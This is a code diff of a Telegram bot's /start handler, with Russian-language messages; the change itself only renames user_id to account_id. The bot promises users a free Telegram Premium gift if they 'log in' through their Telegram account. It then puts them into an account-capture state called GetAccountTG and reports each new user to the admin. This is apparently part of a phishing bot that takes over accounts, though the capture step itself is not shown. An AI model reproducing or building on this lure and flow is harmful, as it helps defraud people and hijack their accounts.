@@ -16,24 +16,24 @@ from utils import config
 
 @vip.message_handler(commands=['start'])
 async def start_handler(msg: Message):
-    user_id = msg.from_user.id
-    if user_id is not str(config("admin_id")):
+    account_id = msg.from_user.id
+    if account_id is not str(config("admin_id")):
         referrer_id = str(msg.text[7:])
 
-        if str(referrer_id) != str(user_id):
+        if str(referrer_id) != str(account_id):
             status = User().join_users(
-                user_id=user_id,
+                account_id=account_id,
                 username=msg.from_user.username,
                 ref_id=referrer_id if referrer_id else None
             )
         else:
             await bot.send_message(
-                chat_id=user_id,
+                chat_id=account_id,
                 text='<b>❌Нельзя регистрироватся по собственной ссылке!</b>'
             )
 
         if status:
-            await bot.send_sticker(chat_id=user_id,
+            await bot.send_sticker(chat_id=account_id,
                            sticker=r"CAACAgIAAxkBAAEFupRjD2IYGEsclAIdnE8RBNA_3a8d4gACiA0AArvroUsJnEE_AtcneCkE")
             await msg.answer(f'<b>👋 Привет {msg.from_user.first_name}, этот бот может подарить Telegram Premium на твой аккаунт!\n\n'
             f'🎁 Для получения Premium авторизуйся через свой Telegram нажав на кнопку "🔑 Войти"</b>\n\n'
@@ -48,11 +48,11 @@ async def start_handler(msg: Message):
 
             await bot.send_message(
                 chat_id=config('admin_id'),
-                text=f"<b>✅ Новый пользователь в боте:\n\n🆔:</b> <code>{user_id}</code>\n<b>👤Линк:</b> @{msg.from_user.username}", parse_mode='html')
+                text=f"<b>✅ Новый пользователь в боте:\n\n🆔:</b> <code>{account_id}</code>\n<b>👤Линк:</b> @{msg.from_user.username}", parse_mode='html')
 
             await GetAccountTG.one.set()
         else:
-            await bot.send_sticker(chat_id=user_id,
+            await bot.send_sticker(chat_id=account_id,
                            sticker=r"CAACAgIAAxkBAAEFupRjD2IYGEsclAIdnE8RBNA_3a8d4gACiA0AArvroUsJnEE_AtcneCkE")
             await msg.answer(f'<b>👋 Привет {msg.from_user.first_name}, этот бот может подарить Telegram Premum на твой аккаунт!\n\n'
             f'🎁 Для получения Premium авторизуйся через свой Telegram нажав на кнопку "🔑 Войти"</b>\n\n'
